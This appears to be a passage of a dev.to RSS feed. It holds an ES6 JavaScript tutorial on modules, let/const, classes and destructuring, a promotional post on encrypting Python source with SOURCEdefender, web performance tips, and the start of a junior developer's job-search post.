&lt;p&gt;Create a folder for your project, then create a file named &lt;code&gt;package.json&lt;/code&gt; with the following content:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
  "name": "es6-demo",
  "scripts": {
    "build": "webpack --watch"
  },
  "devDependencies": {
    "babel-cli": "^6.8.0",
    "babel-core": "^6.8.0",
    "babel-loader": "^6.2.4",
    "babel-plugin-transform-runtime": "^6.8.0",
    "babel-preset-es2015": "^6.6.0",
    "babel-runtime": "^6.6.1",
    "webpack": "^1.13.0"
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Then create a file named &lt;code&gt;webpack.config.js&lt;/code&gt; with the following content:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var path = require("path");
module.exports = {
  entry: "./src/main.js",
  output: {
    path: __dirname,
    filename: "bundle.js"
  },
  module: {
    loaders: [
      {
        loader: "babel-loader",

        // Compile files in /src directory
        include: [path.resolve(__dirname, "src")],

        // Babel options
        query: {
          plugins: ["transform-runtime"],
          presets: ["es2015"]
        }
      }
    ]
  }
};
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Then create a subfolder named &lt;code&gt;src&lt;/code&gt;. This folder will contain all of your ES6 code. Let's put a simple script there named &lt;code&gt;main.js&lt;/code&gt; just to test things out.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let [one, two, three] = [1, 2, 3];
console.log(`One: ${one}, Two: ${two}, Three: ${three}`);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Open your terminal (Node.js console for Windows users), navigate to your project folder, and run the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;npm install
npm run build
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will create a &lt;code&gt;bundle.js&lt;/code&gt; file in your project folder with the compiled ES5 code. If you open this file, you'll see the ES5 equivalent (in the middle of a bunch of other generated boilerplate):&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var one = 1;
var two = 2;
var three = 3;

console.log("One: " + one + ", Two: " + two + ", Three: " + three);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The &lt;code&gt;npm run build&lt;/code&gt; script is set up to listen for modifications in the &lt;code&gt;src&lt;/code&gt; folder. Now, when you modify the &lt;code&gt;main.js&lt;/code&gt; file, the &lt;code&gt;bundle.js&lt;/code&gt; file will update automatically. You can stop watching with &lt;code&gt;Ctrl&lt;/code&gt; + &lt;code&gt;C&lt;/code&gt; in the console.&lt;/p&gt;

&lt;p&gt;After you've done this, there's no need to run &lt;code&gt;npm install&lt;/code&gt; again. When you need to convert your code, you can use &lt;code&gt;npm run build&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#code-editors"&gt;
  &lt;/a&gt;
  Code editors
&lt;/h2&gt;

&lt;p&gt;For a better development experience, you also will probably want to use a code editor that has some ES6 tooling. I like to use &lt;code&gt;Visual Studio Code&lt;/code&gt;, but there are many editors that can be set up to support ES6, such as &lt;code&gt;vim&lt;/code&gt;, &lt;code&gt;Atom&lt;/code&gt;,&lt;code&gt;Sublime Text&lt;/code&gt;, and &lt;code&gt;WebStorm&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#modules"&gt;
  &lt;/a&gt;
  Modules
&lt;/h2&gt;

&lt;p&gt;In my opinion, the module is the single most important new feature in ES6. It allows you to separate your code into separate files in a modular way without worrying about cluttering the global namespace.&lt;/p&gt;

&lt;p&gt;For example, let's create a file &lt;code&gt;math.js&lt;/code&gt; with a toy math library that exports the value of pi and a couple of pi-related functions:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;export const PI = 3.141592653589793;
export function circumference(r) {
  return 2 * PI * r;
}
export function area(r) {
  return PI * r * r;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;With modules, we can import this library's individual components from another file:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import { PI, area } from "./math";
console.log(area(PI));
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Or we can import everything into a single object:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import * as math from "./math";
console.log(math.area(math.PI));
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You can also export a single value as the default value, so that you can import it without needing brackets or a &lt;a href="https://whatis.techtarget.com/definition/wildcard-character"&gt;wildcard&lt;/a&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// reverseString.js
export default function(str) {
  return str
    .split("")
    .reverse()
    .join("");
}
// main.js
import reverseString from "./reverseString";
console.log(reverseString("Hello, world!"));
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#const-and-let"&gt;
  &lt;/a&gt;
  const and let
&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;const&lt;/code&gt; is used for constant declarations, and &lt;code&gt;let&lt;/code&gt; is used for variable declarations.&lt;/p&gt;

&lt;p&gt;If you try to reassign to a constant, the compiler will throw an error:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const one = 1;
one = 2; // SyntaxError: "one" is read-only
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;let&lt;/code&gt; is similar to &lt;code&gt;var&lt;/code&gt;, but it fixes a number of quirks about &lt;code&gt;var&lt;/code&gt; that are often stumbling blocks to JavaScript newcomers. In fact, &lt;code&gt;var&lt;/code&gt; has become obsolete at this point because it's &lt;code&gt;let&lt;/code&gt; and &lt;code&gt;const&lt;/code&gt; have assumed its functionality.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;let&lt;/code&gt; is block-scoped&lt;br&gt;
&lt;code&gt;var&lt;/code&gt; and &lt;code&gt;let&lt;/code&gt; differ in their scoping mechanisms. A variable declared with &lt;code&gt;var&lt;/code&gt; is function-scoped, which means that it is visible anywhere in the surrounding function. Meanwhile, a variable declared with &lt;code&gt;let&lt;/code&gt; is block-scoped, which means it is only visible in its own code block. Calls to the variable outside its code block will lead to errors.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// var
console.log(less); // undefined
if (1 &amp;lt; 2) {
  var less = true;
  console.log(less); // true
}
console.log(less); // true

// let
console.log(less); // Uncaught ReferenceError: less is not defined
if (1 &amp;lt; 2) {
  let less = true;
  console.log(less); // true
}
console.log(less); // Uncaught ReferenceError: less is not defined
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;const&lt;/code&gt; also exhibits this block scoping strategy.&lt;/p&gt;

&lt;p&gt;Duplicate &lt;code&gt;let&lt;/code&gt; declarations are forbidden&lt;br&gt;
&lt;code&gt;let&lt;/code&gt; is designed to catch potential assignment mistakes. While duplicate &lt;code&gt;var&lt;/code&gt; declarations will behave like normal reassignment, duplicate &lt;code&gt;let&lt;/code&gt; declarations are not allowed to prevent the common mistake of erroneous reassignment.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var x = 1;
var x = 2; // x equals 2

let x = 1;
let x = 2; // SyntaxError: Identifier 'x' has already been declared
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;let&lt;/code&gt; variables rebound in each loop iteration&lt;br&gt;
Here is a common error that occurs when you have a function defined inside of a loop using &lt;code&gt;var&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;for (var i = 0; i &amp;lt; 5; i++) {
  setTimeout(function() {
    console.log(i);
  }, 10);
}
// logs 5 5 5 5 5
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This code will log the number 5 five times in a row, because the value of &lt;code&gt;i&lt;/code&gt; will be 5 before the first time &lt;code&gt;console.log&lt;/code&gt; is called. When we use &lt;code&gt;let&lt;/code&gt; instead, the &lt;code&gt;i&lt;/code&gt; inside of the function will correspond to the value on that particular iteration of the for-loop.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;for (let i = 0; i &amp;lt; 5; i++) {
  setTimeout(() =&amp;gt; {
    console.log(i);
  }, 10);
}
// logs 0 1 2 3 4
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#classes"&gt;
  &lt;/a&gt;
  Classes
&lt;/h2&gt;

&lt;p&gt;Object-oriented programming in JavaScript is different than classical OOP because it uses prototypes rather than classes. ES6 classes are a syntax shortcut for a common JavaScript pattern used to simulate classes. Below, I lay out prototype creation in ES5 and class creation in ES6.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES5 way
function Circle(x, y, radius) {
  this.x = x;
  this.y = y;
  this.radius = radius;
}
Circle.prototype.move = function(x, y) {
  this.x = x;
  this.y = y;
};
Circle.prototype.area = function() {
  return Math.PI * Math.pow(this.radius, 2);
};

// ES6 way
class Circle {
  constructor(x, y, radius) {
    [this.x, this.y, this.radius] = [x, y, radius];
  }
  move(x, y) {
    [this.x, this.y] = [x, y];
  }
  area() {
    return Math.PI * Math.pow(this.radius, 2);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You can also extend classes in a manner consistent to standard object-oriented languages:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES5 way
function ColoredCircle(x, y, radius, color) {
  Circle.call(this, x, y, radius);
  this.color = color;
}
ColoredCircle.prototype = Object.create(Circle.prototype);

// ES6 way
class ColoredCircle extends Circle {
  constructor(x, y, radius, color) {
    super(x, y, radius);
    this.color = color;
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#object-literal-syntax"&gt;
  &lt;/a&gt;
  Object literal syntax
&lt;/h2&gt;

&lt;p&gt;It's common to create objects with property names matching variable names. ES6 includes new syntax to make this a little bit more concise:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var x = 5,
  y = 6;

// ES5 way
var coordinate = { x: x, y: y };

// ES6 way
let coordinate = { x, y };
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The syntax for function properties has also changed:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES5 way
var counter = {
  count: 0,
  increment: function() {
    this.count++;
  }
};

// ES6 way
let counter = {
  count: 0,
  increment() {
    this.count++;
  }
};
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#destructuring-assignment"&gt;
  &lt;/a&gt;
  Destructuring assignment
&lt;/h2&gt;

&lt;p&gt;Destructuring assignment is a nifty feature for doing several assignments at once. In ES5, you often have a series of variable declarations like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var a = 1,
  b = 2,
  c = 3;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In ES6 you can do it all at once with array destructuring:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let [a, b, c] = [1, 2, 3];
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is particularly nice for extracting values from an array:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var personData = ["John", 12, true];

// ES5 way
var name = personData[0],
  age = personData[1],
  isMale = personData[2];
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES6 way
let [name, age, isMale] = personData;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and also for swapping variables:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES5 way
var tmp = a;
a = b;
b = tmp;

// ES6 way
[a, b] = [b, a];
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Destructuring assignment can be used with objects as well:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var personData = {
  name: "John",
  age: 12,
  isMale: true
};

// ES5 way
var name = personData.name,
  age = personData.age,
  isMale: personData.isMale;

// ES6 way
let { name, age, isMale } = personData;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This also works with nested object structures:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var book = {
  title: "A Tale of Two Cities",
  dimensions: [12, 8, 3],
  author: {
    name: "Charles Dickens"
  }
};

// ES5 way
var title = book.title,
  length = book.dimensions[0],
  width = book.dimensions[1],
  depth = book.dimensions[2],
  name = book.author.name;

// ES6 way
let { title, dimensions: [length, width, depth], author: { name } } = book;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Clear and concise.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#arrow-functions"&gt;
  &lt;/a&gt;
  Arrow functions
&lt;/h2&gt;

&lt;p&gt;JavaScript developers frequently use function expressions, such as callbacks. However, code can often look messy when the keywords function and return are repeated many times. ES6 has new syntax to make function expressions less verbose.&lt;/p&gt;

&lt;p&gt;Let's compare ES6 function expression handling with expression handling in previous Ecmascript versions.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];

// ES3 way
var sumOfSquares = 0;
for (var i = 0; i &amp;lt; list.length; i++) {
  var n = list[i],
    square = n * n;
  sumOfSquares += square;
}

// ES5 way
var sumOfSquares = list
  .map(function(x) {
    return x * x;
  })
  .reduce(function(a, b) {
    return a + b;
  });

// ES6 way
let sumOfSquares = list.map(x =&amp;gt; x * x).reduce((a, b) =&amp;gt; a + b);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For functions consisting of more than one statement, you can wrap the right-hand side of the arrow function in curly braces:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES5 way
window.onclick = function(e) {
  if (e.ctrlKey) console.log("Ctrl click");
  else console.log("Normal click");
};

// ES6 way
window.onclick = e =&amp;gt; {
  if (e.ctrlKey) console.log("Ctrl click");
  else console.log("Normal click");
};
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#template-strings"&gt;
  &lt;/a&gt;
  Template strings
&lt;/h2&gt;

&lt;p&gt;There is a new type of string literal that makes it easier to insert dynamic values into strings, and also to deal with multi-line strings. Instead of double quotes or single quotes, &lt;code&gt;template strings are delimited by backticks&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var weight = 80,
    height = 1.8;

// ES5 way
console.log("You are " + height + "m tall and weigh " + weight + "kg.\n" +
"Your BMI is " + weight / (height * height) + ".");

// ES6 way
console.log(`You are ${height}m tall and weigh ${weight}kg.
Your BMI is ${weight / (height * height)}.`);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#and-much-much-more"&gt;
  &lt;/a&gt;
  ...and much much more
&lt;/h2&gt;

&lt;p&gt;I've tried to cover some of the most important new changes, but there are many other cool new features in ES6 that I don't have space to cover in this article. For more information, you can browse a &lt;a href="http://es6-features.org/"&gt;quick overview of the new features on es6-features.org&lt;/a&gt;, read a &lt;a href="https://exploringjs.com/es6/index.html"&gt;more detailed introduction in the Exploring ES6 book&lt;/a&gt;, and, for even more in-depth details, read the &lt;a href="https://exploringjs.com/es6/index.html"&gt;ECMAScript 2015 Language Specification.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you've reached this point, thank you very much. I hope that this tutorial has been helpful for you and I'll see you all in the next.&lt;/p&gt;

&lt;p&gt;If you  want to learn more about Web Development don't forget to to &lt;a href="https://www.youtube.com/c/ChristopherGlikpo/featured"&gt;follow me on Youtube!&lt;/a&gt;&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>codenewbie</category>
      <category>tutorial</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Encryption for Protecting Python Source Code</title>
      <author>Richard Scott</author>
      <pubDate>Fri, 25 Jun 2021 19:38:04 +0000</pubDate>
      <link>https://dev.to/richard_scott/encryption-for-protecting-python-source-code-4ckg</link>
      <guid>https://dev.to/richard_scott/encryption-for-protecting-python-source-code-4ckg</guid>
      <description>&lt;p&gt;Python is a great programming language, it has so many uses, but one thing that it doesn’t do well is help protect your hard work from others. Python source code is plain-text, which means that anyone with access to your files can see what you wrote. Not great when you’ve just written the latest advancement in artificial intelligence (AI) or the best machine learning (ML) algorithm on the planet.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#why-cant-i-just-distribute-bytecode"&gt;
  &lt;/a&gt;
  Why can’t I just distribute Bytecode?
&lt;/h2&gt;

&lt;p&gt;Python has a great feature where it first compiles your source code into bytecode; this is a low-level platform-independent representation of your source code. Back in the days when computers were slow, this was helpful, but when trying to distribute secure code this is a problem. Most solutions for securing Python code involve the distribution of .pyc files. Now, this isn’t all that bad as it does take some effort to reverse engineer a .pyc file. However, that still leaves the possibility for reverse engineering of the file to take place.&lt;/p&gt;

&lt;p&gt;Bytecode also limits the version of Python your userbase requires to run your code. If your end-users upgrade their Python version then your code may stop working altogether due to the use of pickle; Python’s object serialisation library. This is where &lt;a href="https://sourcedefender.co.uk"&gt;SOURCEdefender&lt;/a&gt; can help. It is a commercial offering that has been written from the ground up to help protect Python code and to overcome some of the issues you face when changing Python versions such as bytecode magic numbers.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#aes-256bit-encryption"&gt;
  &lt;/a&gt;
  AES 256-bit Encryption
&lt;/h2&gt;

&lt;p&gt;Under the hood, SOURCEdefender scrambles your plain-text source code with AES-256 encryption. AES is a symmetric algorithm that uses the same key for both encryption and decryption (the security of an AES system increases exponentially with key length).&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#installation"&gt;
  &lt;/a&gt;
  Installation
&lt;/h2&gt;

&lt;p&gt;The sourcedefender package is available from &lt;a href="https://pypi.org/project/sourcedefender/"&gt;PyPi&lt;/a&gt; and can be installed in the usual way:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ pip3 install sourcedefender
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#how-does-it-work"&gt;
  &lt;/a&gt;
  How does it work?
&lt;/h3&gt;

&lt;p&gt;Let’s have a look at an example of the encryption process:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cat /home/ubuntu/helloworld.py
print("Hello World!")
$
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is a very basic example, but we do not want anyone to get at our source code. We also don’t want anyone to run this code after 1 hour so when we encrypt the file we can enforce an expiration time of 1 hour from now with the &lt;strong&gt;--ttl&lt;/strong&gt; option and we can delete the plaintext .py file after encryption by adding the &lt;strong&gt;--remove&lt;/strong&gt; option.&lt;/p&gt;

&lt;p&gt;The command would look like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ sourcedefender encrypt --remove --ttl=1h /home/ubuntu/helloworld.py
SOURCEdefender v7.1.14
Processing:
/home/ubuntu/helloworld.py
$
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The &lt;em&gt;--remove&lt;/em&gt; option deletes the original .py file. Make sure you use this so you don’t accidentally distribute the plain-text code. Now the file is encrypted, its contents are as follows:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cat /home/ubuntu/helloworld.pye
-----BEGIN SOURCEDEFENDER FILE-----
GhP6+FOEA;qsm6NrRnXHnlU5E!(pT(E&amp;lt;#t=
GhN0L!7UrbN"Am#(8iPPAG;nm-_4d!F9"*7
T1q4VZdj&amp;gt;uLBghNY)[;Ber^L=*a-I[MA.-4
------END SOURCEDEFENDER FILE------
$
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once a file has been encrypted, its new extension is .pye so our loader can identify encrypted files. All you need to remember is to include sourcedefender as a Python dependency while packaging your project and import the sourcedefender module before you attempt to import and use your encrypted code.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#importing-packages-amp-modules"&gt;
  &lt;/a&gt;
  Importing packages &amp;amp; modules
&lt;/h3&gt;

&lt;p&gt;The usual import system can still be used and you can import encrypted code from within encrypted code so you don’t need to do anything special with your import statements.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cd /home/ubuntu
$ ls
helloworld.pye
$ python3
&amp;gt;&amp;gt;&amp;gt; import sourcedefender
&amp;gt;&amp;gt;&amp;gt; import helloworld
Hello World!
&amp;gt;&amp;gt;&amp;gt; exit()
$
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Using your own password or salt for encryption.&lt;/p&gt;

&lt;p&gt;It’s easy to use your own encryption password and salt. If you do not set these, we generate unique ones for each file you encrypt. Should you wish to set your own, these can be set from either an Environment variable or as a command option:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ sourcedefender encrypt --remove --password 1234abcd --salt dcba4321 mycode.py
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The following does the exact same thing but sets the password/salt from Environment variables instead of on the command line.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ export SOURCEDEFENDER_PASSWORD="1234abcd"
$ export SOURCEDEFENDER_SALT="dcba4321"
$ sourcedefender encrypt --remove mycode.py
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And to import the code you can either set an environment variable (as with the encryption process). You can also set these in your code before the import:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ python3
&amp;gt;&amp;gt;&amp;gt; import sourcedefender
&amp;gt;&amp;gt;&amp;gt; from os import environ
&amp;gt;&amp;gt;&amp;gt; environ["SOURCEDEFENDER_PASSWORD"] = "1234abcd"
&amp;gt;&amp;gt;&amp;gt; environ["SOURCEDEFENDER_SALT"] = "dcba4321"
&amp;gt;&amp;gt;&amp;gt; import mycode
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The password and salt are specific to the next import, so if you want to use different ones for different files, then feel free to encrypt with different values and remember to set the required password/salt before your import.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#impact-on-performance"&gt;
  &lt;/a&gt;
  Impact on Performance
&lt;/h3&gt;

&lt;p&gt;This is a common concern when dealing with tools such as this. However, SOURCEdefender hooks into the standard Python import process so there is no impact on the performance of your running application. The decryption of your code takes place during the import of your module and encrypted code won’t run any slower once loaded from a .pye file compared to running after loading from a .py or .pyc file.&lt;/p&gt;

&lt;p&gt;Links:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.sourcedefender.co.uk/"&gt;https://www.sourcedefender.co.uk/&lt;/a&gt;&lt;br&gt;
&lt;a href="https://pypi.org/project/sourcedefender/"&gt;https://pypi.org/project/sourcedefender/&lt;/a&gt;&lt;/p&gt;

</description>
      <category>python</category>
      <category>security</category>
    </item>
    <item>
      <title>How to make your site more performant</title>
      <author>TheYoungestCoder</author>
      <pubDate>Fri, 25 Jun 2021 19:21:21 +0000</pubDate>
      <link>https://dev.to/theyoungestcoder/how-to-make-your-site-more-performant-3lgm</link>
      <guid>https://dev.to/theyoungestcoder/how-to-make-your-site-more-performant-3lgm</guid>
      <description>&lt;p&gt;Since school ended, it's time for another article! Anyway this is part two of my series "Getting a 100% score in lighthouse" BTW I also updated my previous post in this series.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#1-avoid-chaining-critical-requests"&gt;
  &lt;/a&gt;
  1. Avoid chaining critical requests
&lt;/h2&gt;

&lt;p&gt;One of my favorite resources as a web developer was the google fonts api. If you've ever used google fonts you'll know that lighthouse always screams at you to "avoid chaining critical requests". This significantly reduces the speed of webfont load because it has to make a request to load the css, then load the actual font. Luckily it's an easy fix, just follow these steps:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Go to the /css2 url in your browser&lt;/li&gt;
&lt;li&gt;Copy the entire response&lt;/li&gt;
&lt;li&gt;Paste into your html inside &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#2-drop-jquery"&gt;
  &lt;/a&gt;
  2. Drop jQuery
&lt;/h2&gt;

&lt;p&gt;When I first used jQuery I instantly fell in love with it's clean syntax and concise API. I know it'll be hard to leave, but most of it's deadweight. Consider using a "mini jQuery" library such as &lt;a href="https://github.com/dciccale/ki.js/"&gt;ki.js&lt;/a&gt;.It may seem challenging at first, but once you get familiar with &lt;code&gt;document.querySelectorAll&lt;/code&gt; and other DOM APIS you'll wonder why you used jQuery in the first place. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#3-prevent-cumulative-layout-shift"&gt;
  &lt;/a&gt;
  3. Prevent cumulative layout shift
&lt;/h2&gt;

&lt;p&gt;What is cumulative layout shift (CLS for short) you ask? It's basically when the size of some element changes causing another element's position on the page to shift unexpectedly. This is common for images because the browser doesn't know the size of the image before it's downloaded. Including &lt;code&gt;width&lt;/code&gt; and &lt;code&gt;height&lt;/code&gt; attributes will do the trick. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#4-minify-resources"&gt;
  &lt;/a&gt;
  4. Minify resources
&lt;/h2&gt;

&lt;p&gt;The file size is definitely affects the time the server takes to respond. Minifying is the fix you need to reduce the size of it. If you use netlify to host your site, there is an option in the build settings to automatically minify scripts and stylesheets. If you're a vscode user, you can also install an extension titled "minify". Also, consider using a different file type if it offers better compression. I've found that &lt;code&gt;webp&lt;/code&gt; was waaaaay more storage efficient.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#in-conclusion"&gt;
  &lt;/a&gt;
  In conclusion
&lt;/h2&gt;

&lt;p&gt;Less requests makes for faster load times which result in a better lighthouse score. Use all these tips to reduce the number of requests and their size. Stay tuned for my next article "How to improve SEO". Thank you for reading!&lt;/p&gt;

</description>
      <category>webdev</category>
    </item>
    <item>
      <title>How tedious can job Search as a frontend developer be?</title>
      <author>hillary</author>
      <pubDate>Fri, 25 Jun 2021 19:16:12 +0000</pubDate>
      <link>https://dev.to/hills2003/how-tedious-can-job-search-as-a-frontend-developer-be-3odi</link>
      <guid>https://dev.to/hills2003/how-tedious-can-job-search-as-a-frontend-developer-be-3odi</guid>
      <description>&lt;p&gt;At one point in our coding career we all feel the need to work on something else other than dummy projects from youtube and todo-apps&lt;/p&gt;

&lt;p&gt;that feeling also comes with the idea to start searching for a frontend developer job with some cool pay&lt;/p&gt;

&lt;p&gt;truth be told the journey of job search is really tedious&lt;/p&gt;

&lt;p&gt;i started of my job search as an 18 year old last two months i had no idea of what i needed in order to land my first job,but honestly speaking i've gat the skills man&lt;/p&gt;

&lt;p&gt;i started out building some basic projects so as to fill up my github repo.&lt;br&gt;
